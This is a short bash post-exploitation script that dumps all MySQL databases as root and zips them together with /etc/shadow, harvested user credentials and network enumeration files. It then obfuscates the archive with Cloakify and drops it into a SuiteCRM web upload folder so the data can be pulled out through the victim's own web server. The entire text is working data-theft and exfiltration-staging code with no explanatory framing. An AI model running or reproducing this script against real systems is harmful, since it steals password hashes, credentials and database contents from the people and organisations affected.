#!/bin/bash

BLUE="\033[1;34m"
RED="\033[0;31m"
GREEN="\033[0;32m"
BGREEN="\033[1;32m"
NC="\033[0m" # No Color

echo -e "${BGREEN}\n[+]${NC} Dumping database...${NC}"
mysqldump --all-databases --single-transaction --quick --lock-tables=false > dbstuff.sql -u root

echo -e "${BGREEN}\n[+]${NC} Zipping important files...${NC}"
zip -r exfildata.zip /networkenum.txt /ips_sorted.txt /traceroute.txt /internal_host_scan /users.txt /db_users.txt /user_creds.txt /ps_aux.txt /local_groups.txt /sysenum.txt /etc/shadow /dbstuff.sql

echo -e "${BGREEN}\n[+]${NC} Cloaking zip file...${NC}"
cd /tmp && python2 cloakify.py /exfildata.zip pokemonGo > ignorethis.cloaked

echo -e "${BGREEN}\n[+]${NC} Putting into webpage...${NC}"
cd / && mv /tmp/ignorethis.cloaked /var/www/html/suitecrm/upload

echo -e "${BLUE}\n[+]${NC} All done!${NC}"